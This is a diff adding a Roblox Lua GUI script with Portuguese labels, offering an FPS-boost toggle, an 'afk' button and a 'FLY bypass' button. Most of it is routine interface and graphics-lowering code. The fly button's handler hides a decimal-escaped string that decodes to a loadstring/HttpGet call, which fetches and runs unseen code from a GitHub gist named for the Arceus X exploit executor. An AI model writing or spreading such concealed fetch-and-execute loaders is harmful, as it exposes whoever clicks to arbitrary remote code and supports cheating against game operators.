@@ -1,0 +1,437 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local CPMF = Instance.new("ScreenGui")
+local CONF = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local UICorner_2 = Instance.new("UICorner")
+local TextLabel_2 = Instance.new("TextLabel")
+local ImageButton = Instance.new("ImageButton")
+local UICorner_3 = Instance.new("UICorner")
+local fps = Instance.new("Frame")
+local UICorner_4 = Instance.new("UICorner")
+local on = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local off = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local TextLabel_3 = Instance.new("TextLabel")
+local afk = Instance.new("Frame")
+local UICorner_7 = Instance.new("UICorner")
+local afk_2 = Instance.new("TextButton")
+local UICorner_8 = Instance.new("UICorner")
+local TextLabel_4 = Instance.new("TextLabel")
+local afk_3 = Instance.new("Frame")
+local UICorner_9 = Instance.new("UICorner")
+local fly = Instance.new("TextButton")
+local UICorner_10 = Instance.new("UICorner")
+local TextLabel_5 = Instance.new("TextLabel")
+
+--Properties:
+
+CPMF.Name = "CPMF"
+CPMF.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+CPMF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+CPMF.ResetOnSpawn = false
+
+CONF.Name = "CONF"
+CONF.Parent = CPMF
+CONF.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+CONF.Position = UDim2.new(0.484423995, 0, 0.00712959096, 0)
+CONF.Size = UDim2.new(0, 287, 0, 295)
+
+UICorner.Parent = CONF
+
+TextLabel.Parent = CONF
+TextLabel.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
+TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel.Position = UDim2.new(0.024390243, 0, 0.0215738993, 0)
+TextLabel.Size = UDim2.new(0, 273, 0, 43)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = ""
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 14.000
+
+UICorner_2.Parent = TextLabel
+
+TextLabel_2.Parent = TextLabel
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 0, 127)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.164547652, 0, 0, 0)
+TextLabel_2.Size = UDim2.new(0, 184, 0, 43)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "Configuração"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextStrokeColor3 = Color3.fromRGB(255, 0, 127)
+TextLabel_2.TextStrokeTransparency = 0.000
+TextLabel_2.TextWrapped = true
+
+ImageButton.Parent = CONF
+ImageButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ImageButton.BackgroundTransparency = 1.000
+ImageButton.Position = UDim2.new(0.0225383472, 0, 0.0322121941, 0)
+ImageButton.Size = UDim2.new(0, 36, 0, 36)
+ImageButton.ZIndex = 2
+ImageButton.Image = "http://www.roblox.com/asset/?id=290575049"
+
+UICorner_3.CornerRadius = UDim.new(0, 40)
+UICorner_3.Parent = ImageButton
+
+fps.Name = "fps"
+fps.Parent = CONF
+fps.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+fps.BackgroundTransparency = 0.600
+fps.Position = UDim2.new(0.024390243, 0, 0.191958174, 0)
+fps.Size = UDim2.new(0, 273, 0, 71)
+
+UICorner_4.Parent = fps
+
+on.Name = "on"
+on.Parent = fps
+on.BackgroundColor3 = Color3.fromRGB(43, 255, 20)
+on.Position = UDim2.new(0.0353792608, 0, 0.386045635, 0)
+on.Size = UDim2.new(0, 122, 0, 37)
+on.Font = Enum.Font.PatrickHand
+on.Text = "ON"
+on.TextColor3 = Color3.fromRGB(0, 0, 255)
+on.TextScaled = true
+on.TextSize = 14.000
+on.TextWrapped = true
+
+UICorner_5.Parent = on
+
+off.Name = "off"
+off.Parent = fps
+off.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+off.Position = UDim2.new(0.526132464, 0, 0.386045635, 0)
+off.Size = UDim2.new(0, 122, 0, 37)
+off.Font = Enum.Font.PatrickHand
+off.Text = "Off"
+off.TextColor3 = Color3.fromRGB(0, 0, 255)
+off.TextScaled = true
+off.TextSize = 14.000
+off.TextWrapped = true
+
+UICorner_6.Parent = off
+
+TextLabel_3.Parent = fps
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0.131868139, 0, 0, 0)
+TextLabel_3.Size = UDim2.new(0, 200, 0, 29)
+TextLabel_3.Font = Enum.Font.RobotoMono
+TextLabel_3.Text = "FPS BOOST"
+TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextWrapped = true
+
+afk.Name = "afk"
+afk.Parent = CONF
+afk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+afk.BackgroundTransparency = 0.600
+afk.Position = UDim2.new(0.024390243, 0, 0.456088513, 0)
+afk.Size = UDim2.new(0, 273, 0, 77)
+
+UICorner_7.Parent = afk
+
+afk_2.Name = "afk"
+afk_2.Parent = afk
+afk_2.BackgroundColor3 = Color3.fromRGB(43, 255, 20)
+afk_2.Position = UDim2.new(0.0427053832, 0, 0.463967651, 0)
+afk_2.Size = UDim2.new(0, 249, 0, 34)
+afk_2.Font = Enum.Font.PatrickHand
+afk_2.Text = "afk automatico"
+afk_2.TextColor3 = Color3.fromRGB(0, 0, 255)
+afk_2.TextScaled = true
+afk_2.TextSize = 14.000
+afk_2.TextWrapped = true
+
+UICorner_8.Parent = afk_2
+
+TextLabel_4.Parent = afk
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.Position = UDim2.new(0.131868139, 0, 0, 0)
+TextLabel_4.Size = UDim2.new(0, 200, 0, 29)
+TextLabel_4.Font = Enum.Font.RobotoMono
+TextLabel_4.Text = "AFK (opcional)"
+TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_4.TextScaled = true
+TextLabel_4.TextSize = 14.000
+TextLabel_4.TextWrapped = true
+
+afk_3.Name = "afk"
+afk_3.Parent = CONF
+afk_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+afk_3.BackgroundTransparency = 0.600
+afk_3.Position = UDim2.new(0.024390243, 0, 0.747337401, 0)
+afk_3.Size = UDim2.new(0, 273, 0, 68)
+
+UICorner_9.Parent = afk_3
+
+fly.Name = "fly"
+fly.Parent = afk_3
+fly.BackgroundColor3 = Color3.fromRGB(43, 255, 20)
+fly.Position = UDim2.new(0.0427053832, 0, 0.463967651, 0)
+fly.Size = UDim2.new(0, 249, 0, 34)
+fly.Font = Enum.Font.PatrickHand
+fly.Text = "FLY"
+fly.TextColor3 = Color3.fromRGB(0, 0, 255)
+fly.TextScaled = true
+fly.TextSize = 14.000
+fly.TextWrapped = true
+
+UICorner_10.Parent = fly
+
+TextLabel_5.Parent = afk_3
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.BackgroundTransparency = 1.000
+TextLabel_5.Position = UDim2.new(0.131868139, 0, 0, 0)
+TextLabel_5.Size = UDim2.new(0, 200, 0, 29)
+TextLabel_5.Font = Enum.Font.RobotoMono
+TextLabel_5.Text = "FLY bypass"
+TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_5.TextScaled = true
+TextLabel_5.TextSize = 14.000
+TextLabel_5.TextWrapped = true
+
+-- Scripts:
+
+local function IJVDW_fake_script() -- TextLabel_2.Rainbower 
+	local script = Instance.new('LocalScript', TextLabel_2)
+
+	while wait() do
+		script.Parent.TextColor3 = Color3.new(1,0,0)
+		for i=1,15 do
+			game:GetService("RunService").RenderStepped:wait()
+			script.Parent.TextColor3 = Color3.new(script.Parent.TextColor3.r,script.Parent.TextColor3.g+(17/255),script.Parent.TextColor3.b)
+		end
+		for i=1,15 do
+			game:GetService("RunService").RenderStepped:wait()
+			script.Parent.TextColor3 = Color3.new(script.Parent.TextColor3.r-(17/255),script.Parent.TextColor3.g,script.Parent.TextColor3.b)
+		end
+		for i=1,15 do
+			game:GetService("RunService").RenderStepped:wait()
+			script.Parent.TextColor3 = Color3.new(script.Parent.TextColor3.r,script.Parent.TextColor3.g,script.Parent.TextColor3.b+(17/255))
+		end
+		for i=1,15 do
+			game:GetService("RunService").RenderStepped:wait()
+			script.Parent.TextColor3 = Color3.new(script.Parent.TextColor3.r,script.Parent.TextColor3.g-(17/255),script.Parent.TextColor3.b)
+		end
+		for i=1,15 do
+			game:GetService("RunService").RenderStepped:wait()
+			script.Parent.TextColor3 = Color3.new(script.Parent.TextColor3.r+(17/255),script.Parent.TextColor3.g,script.Parent.TextColor3.b)
+		end
+		for i=1,15 do
+			game:GetService("RunService").RenderStepped:wait()
+			script.Parent.TextColor3 = Color3.new(script.Parent.TextColor3.r,script.Parent.TextColor3.g,script.Parent.TextColor3.b-(17/255))
+		end
+	end
+end
+coroutine.wrap(IJVDW_fake_script)()
+local function QHMCIJK_fake_script() -- ImageButton.fechar 
+	local script = Instance.new('LocalScript', ImageButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Visible = false
+	end)
+	
+	
+	
+	
+end
+coroutine.wrap(QHMCIJK_fake_script)()
+local function CMMVGEX_fake_script() -- CONF.LocalScript 
+	local script = Instance.new('LocalScript', CONF)
+
+	local dragger = {}; 
+	local resizer = {};
+	
+	do
+		local mouse = game:GetService("Players").LocalPlayer:GetMouse();
+		local inputService = game:GetService('UserInputService');
+		local heartbeat = game:GetService("RunService").Heartbeat;
+		-- // credits to Ririchi / Inori for this cute drag function :)
+		function dragger.new(frame)
+		    local s, event = pcall(function()
+		    	return frame.MouseEnter
+		    end)
+	
+		    if s then
+		    	frame.Active = true;
+	
+		    	event:connect(function()
+		    		local input = frame.InputBegan:connect(function(key)
+		    			if key.UserInputType == Enum.UserInputType.MouseButton1 then
+		    				local objectPosition = Vector2.new(mouse.X - frame.AbsolutePosition.X, mouse.Y - frame.AbsolutePosition.Y);
+		    				while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
+		    					frame:TweenPosition(UDim2.new(0, mouse.X - objectPosition.X + (frame.Size.X.Offset * frame.AnchorPoint.X), 0, mouse.Y - objectPosition.Y + (frame.Size.Y.Offset * frame.AnchorPoint.Y)), 'Out', 'Quad', 0.1, true);
+		    				end
+		    			end
+		    		end)
+	
+		    		local leave;
+		    		leave = frame.MouseLeave:connect(function()
+		    			input:disconnect();
+		    			leave:disconnect();
+		    		end)
+		    	end)
+		    end
+		end
+		
+		function resizer.new(p, s)
+			p:GetPropertyChangedSignal('AbsoluteSize'):connect(function()
+				s.Size = UDim2.new(s.Size.X.Scale, s.Size.X.Offset, s.Size.Y.Scale, p.AbsoluteSize.Y);
+			end)
+		end
+	end
+	script.Parent.Active = true
+	script.Parent.Draggable = true
+end
+coroutine.wrap(CMMVGEX_fake_script)()
+local function PKQCVJB_fake_script() -- on.LocalScript 
+	local script = Instance.new('LocalScript', on)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
+		local g = game
+		local w = g.Workspace
+		local l = g.Lighting
+		local t = w.Terrain
+		t.WaterWaveSize = 0
+		t.WaterWaveSpeed = 0
+		t.WaterReflectance = 0
+		t.WaterTransparency = 0
+		l.GlobalShadows = false
+		l.FogEnd = 9e9
+		l.Brightness = 0
+		settings().Rendering.QualityLevel = "Level01"
+		for i, v in pairs(g:GetDescendants()) do
+			if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+				v.Material = "Plastic"
+				v.Reflectance = 0
+			elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
+				v.Transparency = 1
+			elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+				v.Lifetime = NumberRange.new(0)
+			elseif v:IsA("Explosion") then
+				v.BlastPressure = 1
+				v.BlastRadius = 1
+			elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
+				v.Enabled = false
+			elseif v:IsA("MeshPart") then
+				v.Material = "Plastic"
+				v.Reflectance = 0
+				v.TextureID = 10385902758728957
+			end
+		end
+		for i, e in pairs(l:GetChildren()) do
+			if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
+				e.Enabled = false
+			end
+		end
+	end)
+end
+coroutine.wrap(PKQCVJB_fake_script)()
+local function GCFBEO_fake_script() -- off.LocalScript 
+	local script = Instance.new('LocalScript', off)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local decalsyeeted = false -- Leaving this on makes games look shitty but the fps goes up by at least 20.
+		local g = game
+		local w = g.Workspace
+		local l = g.Lighting
+		local t = w.Terrain
+		t.WaterWaveSize = 0
+		t.WaterWaveSpeed = 0
+		t.WaterReflectance = 0
+		t.WaterTransparency = 0
+		l.GlobalShadows = false
+		l.FogEnd = 9e9
+		l.Brightness = 0
+		settings().Rendering.QualityLevel = "Level01"
+		for i, v in pairs(g:GetDescendants()) do
+			if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+				v.Material = "Plastic"
+				v.Reflectance = 0
+			elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
+				v.Transparency = 1
+			elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+				v.Lifetime = NumberRange.new(0)
+			elseif v:IsA("Explosion") then
+				v.BlastPressure = 1
+				v.BlastRadius = 1
+			elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
+				v.Enabled = false
+			elseif v:IsA("MeshPart") then
+				v.Material = "Plastic"
+				v.Reflectance = 0
+				v.TextureID = 10385902758728957
+			end
+		end
+		for i, e in pairs(l:GetChildren()) do
+			if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
+				e.Enabled = false
+			end
+		end
+	end)
+end
+coroutine.wrap(GCFBEO_fake_script)()
+local function UCWX_fake_script() -- afk_2.LocalScript 
+	local script = Instance.new('LocalScript', afk_2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
+		local g = game
+		local w = g.Workspace
+		local l = g.Lighting
+		local t = w.Terrain
+		t.WaterWaveSize = 0
+		t.WaterWaveSpeed = 0
+		t.WaterReflectance = 0
+		t.WaterTransparency = 0
+		l.GlobalShadows = false
+		l.FogEnd = 9e9
+		l.Brightness = 0
+		settings().Rendering.QualityLevel = "Level01"
+		for i, v in pairs(g:GetDescendants()) do
+			if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
+				v.Material = "Plastic"
+				v.Reflectance = 0
+			elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
+				v.Transparency = 1
+			elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
+				v.Lifetime = NumberRange.new(0)
+			elseif v:IsA("Explosion") then
+				v.BlastPressure = 1
+				v.BlastRadius = 1
+			elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") then
+				v.Enabled = false
+			elseif v:IsA("MeshPart") then
+				v.Material = "Plastic"
+				v.Reflectance = 0
+				v.TextureID = 10385902758728957
+			end
+		end
+		for i, e in pairs(l:GetChildren()) do
+			if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
+				e.Enabled = false
+			end
+		end
+	end)
+end
+coroutine.wrap(UCWX_fake_script)()
+local function DYCOV_fake_script() -- fly.LocalScript 
+	local script = Instance.new('LocalScript', fly)
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
+
+	end)
+	
+end
+coroutine.wrap(DYCOV_fake_script)()
